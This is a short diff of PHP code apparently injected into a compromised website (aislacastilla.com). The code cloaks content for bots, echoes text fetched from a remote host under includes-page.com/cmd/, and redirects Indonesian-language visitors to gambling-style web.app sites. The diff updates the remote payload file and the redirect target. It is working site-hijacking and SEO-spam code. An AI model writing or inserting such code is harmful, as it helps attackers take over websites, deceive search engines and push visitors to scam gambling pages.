@@ -8,14 +8,14 @@ $s_ref = $_SERVER['HTTP_REFERER'];
             echo ' '; // Your bot-specific content
             exit;
         }
-        echo file_get_contents("https://includes-page.com/cmd/aislacastilla.com/lp2.txt");
+        echo file_get_contents("https://includes-page.com/cmd/aislacastilla.com/lp.txt");
         exit;
         ?>
         <?php
     }
     $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
     if ($browserLang == 'id') {
-        header("Location: https://ibo-slot-gacor.web.app/");
+        header("Location: https://pemulaphuss.web.app/");
         exit;
     }
 /**
